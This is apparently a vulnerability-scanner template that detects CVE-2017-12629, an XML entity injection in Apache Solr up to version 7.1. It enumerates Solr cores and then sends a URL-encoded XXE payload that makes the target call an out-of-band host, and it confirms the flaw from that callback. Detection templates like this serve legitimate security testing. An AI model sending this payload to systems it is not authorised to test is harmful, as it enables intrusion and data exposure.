id: CVE-2017-12629

info:
  name: Apache Solr <= 7.1 XML entity injection
  author: dwisiswant0
  severity: critical
  tags: cve,cve2017,solr,apache,oob,xxe
  reference: |
      - https://nvd.nist.gov/vuln/detail/CVE-2017-12629
      - https://twitter.com/honoki/status/1298636315613974532
      - https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-XXE
      - https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-RCE

requests:
  - raw:
      - |
        GET /solr/admin/cores?wt=json HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /solr/{{core}}/select?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22https%3A%2F%2F{{interactsh-url}}%2F%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&wt=xml&defType=xmlparser HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"

    extractors:
      - type: regex
        internal: true
        name: core
        group: 1
        regex:
          - '"name"\:"(.*?)"'